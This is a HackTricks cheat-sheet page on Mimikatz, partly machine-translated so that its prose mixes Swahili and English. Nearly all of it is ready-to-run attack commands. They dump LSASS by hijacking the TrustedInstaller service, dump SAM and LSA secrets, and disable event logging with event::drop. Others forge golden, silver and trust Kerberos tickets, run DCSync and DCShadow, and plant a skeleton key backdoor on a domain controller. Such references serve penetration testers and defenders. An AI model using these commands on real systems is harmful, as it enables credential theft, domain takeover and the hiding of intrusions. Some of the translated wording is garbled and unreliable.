# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!

## LM na Maneno ya Kawaida katika kumbukumbu

Kuanzia Windows 8.1 na Windows Server 2012 R2 kuendelea, hatua kubwa zimechukuliwa kulinda dhidi ya wizi wa akidi:

- **LM hashes na nywila za maandiko ya kawaida** hazihifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekwa na thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha kwamba nywila "za maandiko ya kawaida" hazihifadhiwi katika LSASS.

- **Ulinzi wa LSA** umeanzishwa ili kulinda mchakato wa Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindano ya msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato ulio na ulinzi. Kuanzisha Ulinzi wa LSA kunahusisha:
1. Kubadilisha rejista katika _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
2. Kutekeleza Kituo cha Sera ya Kundi (GPO) kinacholazimisha mabadiliko haya ya rejista katika vifaa vinavyosimamiwa.

Licha ya ulinzi huu, zana kama Mimikatz zinaweza kupita Ulinzi wa LSA kwa kutumia madereva maalum, ingawa vitendo kama hivyo vinaweza kurekodiwa katika kumbukumbu za matukio.

### Kupambana na Kuondolewa kwa SeDebugPrivilege

Wasimamizi kwa kawaida wana SeDebugPrivilege, ambayo inawawezesha kufuatilia programu. Haki hii inaweza kupunguzwa ili kuzuia dump za kumbukumbu zisizoidhinishwa, mbinu ya kawaida inayotumiwa na washambuliaji kutoa akidi kutoka kwa kumbukumbu. Hata hivyo, hata haki hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya dump za kumbukumbu kwa kutumia usanidi maalum wa huduma:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Hii inaruhusu kutolewa kwa kumbukumbu ya `lsass.exe` kwenye faili, ambayo inaweza kuchambuliwa kwenye mfumo mwingine ili kutoa akidi:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: Hii hatua inalenga kufuta kumbukumbu za matukio, na kufanya iwe vigumu kufuatilia shughuli mbaya.
- Mimikatz haitoi amri moja kwa moja katika hati zake za kawaida za kufuta kumbukumbu za matukio moja kwa moja kupitia mstari wake wa amri. Hata hivyo, usimamizi wa kumbukumbu za matukio kwa kawaida unahusisha kutumia zana za mfumo au skripti nje ya Mimikatz kufuta kumbukumbu maalum (kwa mfano, kutumia PowerShell au Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Amri hii ya majaribio imeundwa kubadilisha tabia ya Huduma ya Kumbukumbu za Matukio, kwa ufanisi kuzuia kurekodi matukio mapya.
- Mfano: `mimikatz "privilege::debug" "event::drop" exit`

- Amri ya `privilege::debug` inahakikisha kwamba Mimikatz inafanya kazi kwa ruhusa zinazohitajika kubadilisha huduma za mfumo.
- Amri ya `event::drop` kisha inarekebisha huduma ya Kumbukumbu za Matukio.


### Kerberos Ticket Attacks

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Jina la eneo.
- `/sid`: Kitambulisho cha Usalama wa eneo (SID).
- `/user`: Jina la mtumiaji wa kuiga.
- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya eneo.
- `/ptt`: Inachoma tiketi moja kwa moja kwenye kumbukumbu.
- `/ticket`: Huhifadhi tiketi kwa matumizi ya baadaye.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets hutoa ufikiaji kwa huduma maalum. Amri muhimu na vigezo:

- Amri: Inafanana na Golden Ticket lakini inalenga huduma maalum.
- Vigezo:
- `/service`: Huduma ya kulenga (mfano, cifs, http).
- Vigezo vingine vinavyofanana na Golden Ticket.

Mfano:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Uundaji wa Tiketi ya Kuamini

Tiketi za Kuamini zinatumika kwa kupata rasilimali kati ya maeneo kwa kutumia uhusiano wa kuamini. Amri kuu na vigezo:

- Amri: Inafanana na Tiketi ya Dhahabu lakini kwa uhusiano wa kuamini.
- Vigezo:
- `/target`: FQDN ya eneo lengwa.
- `/rc4`: Hash ya NTLM kwa akaunti ya kuamini.

Mfano:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Amri za Nyongeza za Kerberos

- **Orodha ya Tiketi**:
- Amri: `kerberos::list`
- Inoorodhesha tiketi zote za Kerberos kwa kikao cha mtumiaji wa sasa.

- **Pita kwenye Kache**:
- Amri: `kerberos::ptc`
- Inachanganya tiketi za Kerberos kutoka kwa faili za kache.
- Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pita Tiketi**:
- Amri: `kerberos::ptt`
- Inaruhusu kutumia tiketi ya Kerberos katika kikao kingine.
- Mfano: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Futa Tiketi**:
- Amri: `kerberos::purge`
- Inafuta tiketi zote za Kerberos kutoka kwenye kikao.
- Inafaida kabla ya kutumia amri za kubadilisha tiketi ili kuepuka migongano.


### Uingiliaji wa Active Directory

- **DCShadow**: Fanya mashine kuwa DC kwa muda kwa ajili ya uhamasishaji wa kituo cha AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Fanya kama DC ili kuomba data za nywila.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Upatikanaji wa Akikazi

- **LSADUMP::LSA**: Toa akiba kutoka LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Fanya kama DC kwa kutumia data za nywila za akaunti ya kompyuta.
- *Hakuna amri maalum iliyotolewa kwa NetSync katika muktadha wa asili.*

- **LSADUMP::SAM**: Fikia hifadhidata ya SAM ya ndani.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Fanya ufichuzi wa siri zilizohifadhiwa kwenye rejista.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Weka hash mpya ya NTLM kwa mtumiaji.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pata taarifa za uthibitisho wa uaminifu.
- `mimikatz "lsadump::trust" exit`

### Mambo Mbalimbali

- **MISC::Skeleton**: Ingiza nyuma ya mlango kwenye LSASS kwenye DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Kuinua Haki

- **PRIVILEGE::Backup**: Pata haki za nakala.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Pata haki za debug.
- `mimikatz "privilege::debug" exit`

### Utoaji wa Akikazi

- **SEKURLSA::LogonPasswords**: Onyesha akiba za watumiaji walioingia.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Toa tiketi za Kerberos kutoka kwenye kumbukumbu.
- `mimikatz "sekurlsa::tickets /export" exit`

### Uhamasishaji wa Sid na Token

- **SID::add/modify**: Badilisha SID na SIDHistory.
- Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Badilisha: *Hakuna amri maalum ya kubadilisha katika muktadha wa asili.*

- **TOKEN::Elevate**: Fanya kama token.
- `mimikatz "token::elevate /domainadmin" exit`

### Huduma za Terminal

- **TS::MultiRDP**: Ruhusu vikao vingi vya RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Orodhesha vikao vya TS/RDP.
- *Hakuna amri maalum iliyotolewa kwa TS::Sessions katika muktadha wa asili.*

### Vault

- Toa nywila kutoka Windows Vault.
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
